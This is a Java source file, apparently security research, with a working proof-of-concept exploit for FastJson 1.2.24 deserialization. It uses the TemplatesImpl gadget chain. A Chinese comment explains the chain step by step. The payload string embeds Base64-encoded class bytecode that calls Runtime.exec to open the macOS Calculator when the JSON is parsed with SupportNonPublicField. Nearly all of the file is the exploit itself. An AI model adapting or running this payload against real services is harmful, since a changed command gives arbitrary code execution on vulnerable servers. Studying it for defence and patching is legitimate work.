package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;

/**
 * FastJson 1.2.24，需要开启SupportNonPublicField特性
 *
 * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl利用链
 *
 * TemplatesImpl对象恢复->JavaBeanDeserializer.deserialze
 * ->FieldDeserializer.setValue->TemplatesImpl.getOutputProperties
 * ->TemplatesImpl.newTransformer->TemplatesImpl.getTransletInstance
 * ->通过defineTransletClasses，newInstance触发我们自己构造的class的静态代码块
 *
 * _bytecodes为Base64编码过的Test类字节码
 *
 * @author zhujiang.cheng
 * @since 2020/6/3
 */
public class XalanAttack {

    public static void main(String[] args) {
        String payload = "{\n"
            + "  \"rand1\": {\n"
            + "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n"
            + "    \"_bytecodes\": [\n"
            + "      \"yv66vgAAADQAOwoACgAiCgAjACQIACUKACMAJgkAJwAoCAAUCgApACoIACsHACwHAC0BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEANUxjb20vcGluZ3Bvbmd4L2FyY2gvc2VjdXJpdHkvc2VyaWFsaXplL2Zhc3Rqc29uL1Rlc3Q7AQAKRXhjZXB0aW9ucwcALgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAsADAcAMAwAMQAyAQAhb3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAzADQHADUMADYANwcAOAwAOQA6AQAXdHJhbnNmb3JtIHdpdGggaXRlcmF0b3IBADNjb20vcGluZ3Bvbmd4L2FyY2gvc2VjdXJpdHkvc2VyaWFsaXplL2Zhc3Rqc29uL1Rlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAJAAoAAAAAAAMAAQALAAwAAgANAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAA4AAAAOAAMAAAAQAAQAEQANABIADwAAAAwAAQAAAA4AEAARAAAAEgAAAAQAAQATAAEAFAAVAAIADQAAAEsAAgADAAAACbIABRIGtgAHsQAAAAIADgAAAAoAAgAAABYACAAXAA8AAAAgAAMAAAAJABAAEQAAAAAACQAWABcAAQAAAAkAGAAZAAIAEgAAAAQAAQAaAAEAFAAbAAIADQAAAFUAAgAEAAAACbIABRIItgAHsQAAAAIADgAAAAoAAgAAABwACAAdAA8AAAAqAAQAAAAJABAAEQAAAAAACQAWABcAAQAAAAkAHAAdAAIAAAAJAB4AHwADABIAAAAEAAEAGgABACAAAAACACE=\"\n"
            + "    ],\n"
            + "    \"_name\": \"aaa\",\n"
            + "    \"_tfactory\": {},\n"
            + "    \"_outputProperties\": {}\n"
            + "  }\n"
            + "}";
        JSONObject jsonObject = JSON.parseObject(payload, Feature.SupportNonPublicField);
        System.out.println(jsonObject);
    }

}
